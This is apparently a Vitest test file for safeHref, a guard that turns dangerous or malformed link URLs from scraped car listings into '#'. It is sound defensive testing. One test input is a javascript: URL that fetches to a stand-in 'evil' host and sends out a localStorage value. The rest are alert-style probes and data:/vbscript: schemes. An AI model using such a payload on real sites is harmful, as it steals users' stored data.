import { describe, expect, it } from "vitest";
import { safeHref } from "./url";

describe("safeHref (href XSS guard for scraped listing urls)", () => {
  it("passes through real http(s) listing urls unchanged", () => {
    expect(safeHref("https://cars.ksl.com/listing/9210001")).toBe(
      "https://cars.ksl.com/listing/9210001"
    );
    expect(safeHref("http://example.com/x")).toBe("http://example.com/x");
  });

  it("neutralizes a javascript: url so it can't execute on click", () => {
    expect(safeHref("javascript:fetch('//evil/x?d='+localStorage.getItem('apex_notes'))")).toBe("#");
    expect(safeHref("JavaScript:alert(1)")).toBe("#");
  });

  it("neutralizes other dangerous schemes", () => {
    expect(safeHref("data:text/html,<script>alert(1)</script>")).toBe("#");
    expect(safeHref("vbscript:msgbox(1)")).toBe("#");
  });

  it("treats missing / unparseable / relative urls as inert", () => {
    expect(safeHref(null)).toBe("#");
    expect(safeHref(undefined)).toBe("#");
    expect(safeHref("")).toBe("#");
    expect(safeHref("not a url")).toBe("#");
    expect(safeHref("/relative/path")).toBe("#");
  });
});
